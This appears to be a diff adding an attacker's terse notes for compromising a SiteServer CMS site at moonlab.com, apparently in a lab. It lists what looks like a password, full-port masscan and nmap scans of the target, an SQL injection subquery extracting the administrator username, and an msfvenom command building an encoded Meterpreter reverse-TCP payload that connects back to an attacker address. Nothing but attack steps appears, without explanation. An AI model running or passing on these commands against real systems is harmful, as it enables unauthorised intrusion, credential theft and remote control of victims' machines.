@@ -1,0 +1,9 @@
+!@#QWE123
+www.moonlab.com
+www.moonlab.com/siteserver/forgetPassword.aspx
+kali:
+vi /etc/hosts
+masscan -p 1-65535 222.222.222.119 --rate=100
+nmap -A -p 80,6588,999,21,5985,3389 222.222.222.119 -sV -oA attack-ports
+(select top 1 username from [msmoonlab].[msmoonlab].[bairong_Administrator])
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=222.222.222.112 LPOST=2333 -e x86/shikata_ga_nai -i 20 -f csharp -o payload.txt
